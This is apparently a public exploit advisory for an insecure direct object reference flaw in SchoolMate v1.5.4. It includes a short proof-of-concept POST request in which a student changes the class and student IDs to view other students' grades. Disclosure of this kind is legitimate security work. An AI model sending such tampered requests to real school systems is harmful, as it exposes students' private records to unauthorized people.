# Exploit Title: SchoolMate v1.5.4 - Insecure Direct Object Reference(IDOR)
## Date: 4/1/2024
## Vendor Homepage: https://sourceforge.net/projects/schoolmate/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SchoolMate
## Version: v1.5.4
## Exploit Description:
## SchoolMate v1.5.4 suffers from IDOR - Broken Access Control Vulnerability allowing attacker student to look up grade of other student in every class(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /index.php HTTP/1.1
...

page2=3&logout=&page=4&selectclass=1(CHANGE HERE)&student=3(CHANGE HERE)
```